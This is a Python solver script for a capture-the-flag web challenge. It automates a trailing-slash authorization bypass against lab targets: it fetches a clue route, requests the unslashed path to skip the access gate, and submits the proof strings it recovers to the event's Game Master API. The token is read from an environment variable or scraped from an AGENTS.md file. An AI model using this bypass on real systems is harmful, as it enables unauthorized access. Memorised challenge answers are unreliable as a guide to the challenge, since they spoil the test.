#!/usr/bin/env python3
"""Generic solver for "Administratively Speaking" (web-exploitation day 05).

Mechanism (identical across variants):
  1. GET /api/clues -> {"feature_route": "/<route>", ...}
  2. GET <feature_route> WITHOUT a trailing slash -> JSON carrying
     {"ok": true, "effect": "framework_authorization_bypassed",
      "evidence": "proof_<hex>"}
     The authorization gate only covers the canonical (slashed) path, so the
     un-slashed variant walks straight past it. The slashed path 404s.

The proof string in `evidence` is the exact answer for that target.

Drives the whole Game Master loop: start (optionally run_for_time) -> read
targets[] -> exploit each -> map proofs to the matching answer_id via each
question's `artifact` ("Target N") -> submit every answer in one request.

Usage:
  python3 -I solve.py <mode>            # regular untimed scored attempt
  python3 -I solve.py <mode> --timed    # fresh timed Hall of Fame attempt
  python3 -I solve.py <mode> --retry    # advance to next variant, then solve
where <mode> is single_solve | time_trial | mastery.
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE_ID = "web-exploitation-day-05-administratively-speaking"
GM = os.environ.get("HUNTRESS_GM_URL", "https://2026.huntress.ctf.games/").rstrip("/") + "/"
# AGENTS.md lives four levels up from this script.
AGENTS = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                      "..", "..", "..", "..", "AGENTS.md")


def token():
    t = os.environ.get("HUNTRESS_GM_TOKEN")
    if t:
        return t
    with open(os.path.abspath(AGENTS)) as fh:
        return re.search(r"HUNTRESS_GM_TOKEN=(gm1\.[\w.]+)", fh.read())[1]


def gm(payload=None, **query):
    url = GM + ("?" + urllib.parse.urlencode(query) if query else "")
    body = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=body, headers={
        "Authorization": "Bearer " + token(), "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            return json.load(r)
    except urllib.error.HTTPError as exc:
        return {"http_status": exc.code, **json.loads(exc.read())}


def http_json(url):
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def exploit(target_url):
    """Return the proof string recovered from one live target."""
    base = target_url.rstrip("/")
    clues = http_json(base + "/api/clues")
    route = clues["feature_route"]
    # The bypass: request the feature route WITHOUT a trailing slash.
    res = http_json(base + route)
    return res["evidence"], route, res.get("effect")


def wait_active(cid, run_for_time):
    """start (reconnects if already live); poll until targets are ready."""
    payload = {"op": "start", "challenge": cid}
    if run_for_time:
        payload["run_for_time"] = True
    data = gm(payload)
    for _ in range(30):
        if data.get("targets"):
            return data
        if data.get("result") in ("preparing",) or data.get("status") == "preparing" \
                or not data.get("targets"):
            time.sleep(2)
            data = gm(op="status", challenge=cid)
        else:
            break
    return data


def solve(mode, timed=False, do_retry=False):
    cid = BASE_ID if mode == "single_solve" else f"{BASE_ID}/{mode}"
    if do_retry:
        rp = {"op": "retry", "challenge": cid}
        if timed:
            rp["run_for_time"] = True
        print("retry:", json.dumps(gm(rp)))
    data = wait_active(cid, timed)
    questions = data["questions"]
    targets = {t["id"]: t["url"] for t in data["targets"]}
    deadline = data.get("deadline")
    print(f"attempt={data.get('attempt_id')} deadline={deadline} "
          f"targets={list(targets)} answer_ids={data.get('answer_ids')}")

    answers = {}
    for q in questions:
        tid = q["artifact"]                      # e.g. "Target 1"
        url = targets[tid]
        proof, route, effect = exploit(url)
        answers[q["id"]] = proof
        print(f"  {q['id']} <- {tid} route={route} effect={effect} proof={proof}")

    result = gm({"op": "submit", "challenge": cid, "answers": answers})
    print("submit:", json.dumps({k: result.get(k) for k in
          ("result", "remaining", "flag", "status", "hall_of_fame", "elapsed_ms")
          if k in result}))
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["single_solve", "time_trial", "mastery"])
    ap.add_argument("--timed", action="store_true", help="run_for_time Hall of Fame attempt")
    ap.add_argument("--retry", action="store_true", help="retry to next variant first")
    a = ap.parse_args()
    r = solve(a.mode, timed=a.timed, do_retry=a.retry)
    sys.exit(0 if r.get("result") in ("CORRECT", "accepted") else 1)
